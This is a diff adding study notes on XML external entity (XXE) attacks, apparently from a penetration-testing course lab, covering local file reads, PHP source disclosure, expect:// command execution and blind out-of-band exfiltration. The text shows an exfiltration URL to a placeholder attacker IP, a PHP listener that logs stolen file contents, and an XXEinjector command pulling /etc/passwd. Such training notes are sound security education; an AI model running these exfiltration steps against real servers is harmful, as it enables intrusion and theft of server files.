@@ -551,3 +551,130 @@ Use in document: &company; → replaced with Inlane Freight.
 
 When parsed server-side (e.g., SOAP APIs or form uploads), external entities can load local server files. If the file content is returned to the attacker, it can leak sensitive server data.
 
+# Local File Disclosure via XXE
+
+
+When a web app accepts unfiltered XML input, we can define external entities that reference local files on the server. If the app displays the entity value in the response, we can read those files.
+
+**1. Identifying XXE**
+
+- Look for web pages that accept XML input (e.g., a contact form).
+- Intercept the request in Burp Suite and check if the request body is XML.
+
+Example request:
+
+<img width="385" height="187" alt="image" src="https://github.com/user-attachments/assets/48762a39-aecf-406d-922d-c717f4303cb9" />
+
+If the app reflects back any XML field value, it’s a candidate for XXE.
+
+**2. Testing with an Internal Entity**
+
+Add a DOCTYPE and define an entity:
+
+<img width="455" height="296" alt="image" src="https://github.com/user-attachments/assets/bce1a703-f2c4-4af0-9283-79286edb46a9" />
+
+If &company; is replaced with "Inlane Freight" in the response, XML injection is possible.
+
+**3. Reading Local Files**
+
+Use an external entity:
+
+<img width="532" height="303" alt="image" src="https://github.com/user-attachments/assets/68851dbc-aff3-452d-a39b-e8f4059a38b5" />
+
+If the /etc/passwd content is shown, the app is vulnerable.
+
+**4. Reading Source Code (PHP Example)**
+
+PHP's php://filter allows base64-encoded file reads:
+
+<img width="875" height="293" alt="image" src="https://github.com/user-attachments/assets/f4d5aba6-22e5-4c27-aa97-d6f70107ee01" />
+
+Decode the base64 to view the source.
+
+**5. Remote Code Execution (PHP expect module)**
+
+If enabled, expect:// can run commands:
+
+<img width="502" height="330" alt="image" src="https://github.com/user-attachments/assets/e5274004-a5d4-4300-b91a-9f131bbe82ed" />
+
+You can also use curl to fetch a web shell from your server.
+
+**6. DoS Attack (Billion Laughs)**
+
+<img width="695" height="480" alt="image" src="https://github.com/user-attachments/assets/c2cd7519-394d-47a2-9c4b-b7a4baa0ccd6" />
+
+This can overload memory on vulnerable servers (most modern ones block it).
+
+# Blind XXE Data Exfiltration
+
+In some XXE cases, no entity values or error messages are shown — making the vulnerability completely blind.
+We can still exfiltrate files using Out-of-Band (OOB) data exfiltration by making the target server send the file contents to us.
+
+**1. OOB File Exfiltration (Manual)**
+
+We host a malicious DTD that:
+
+- Reads the target file.
+- Base64-encodes it.
+- Sends it to our server as an HTTP request parameter.
+
+xxe.dtd
+
+<img width="852" height="68" alt="image" src="https://github.com/user-attachments/assets/b74ae9ba-568e-445e-aacf-fae31343e989" />
+
+If `/etc/passwd` contains `root:x:0:0:root:/root:/bin/bash`, it will be sent to:
+
+`http://OUR_IP:8000/?content=<BASE64>`
+
+We can then decode it locally.
+
+**2. Local PHP Listener**
+
+<pre><?php
+if (isset($_GET['content'])) {
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?></pre>
+
+Run the listener:
+
+`vi index.php   # Paste PHP code`
+`php -S 0.0.0.0:8000`
+
+**3. Blind XXE Payload**
+
+<img width="633" height="218" alt="image" src="https://github.com/user-attachments/assets/b75b9030-7aea-4220-b5db-58b046491b5c" />
+
+Send as POST to:
+
+`/blind/submitDetails.php`
+
+**4. Example Output on Listener**
+
+<pre>10.10.14.16:46256 /xxe.dtd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...SNIP...</pre>
+
+Tip: Instead of sending data in the URL parameter, you can use DNS exfiltration
+(e.g., <BASE64>.our-domain.com) and capture traffic with tcpdump.
+
+**5. Automated OOB XXE (XXEinjector)**
+
+Clone the tool:
+
+`git clone https://github.com/enjoiz/XXEinjector.git`
+
+Save the intercepted HTTP request from Burp to /tmp/xxe.req, replacing the XML body with:
+
+<img width="403" height="42" alt="image" src="https://github.com/user-attachments/assets/b4fb5e78-0676-4d7a-877c-3720424f8e11" />
+
+XXEINJECT
+
+Run:
+
+`ruby XXEinjector.rb --host=<YOUR_IP> --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter`
+
+Decoded files will be stored in:
+
+`Logs/<target_ip>/<file>.log`
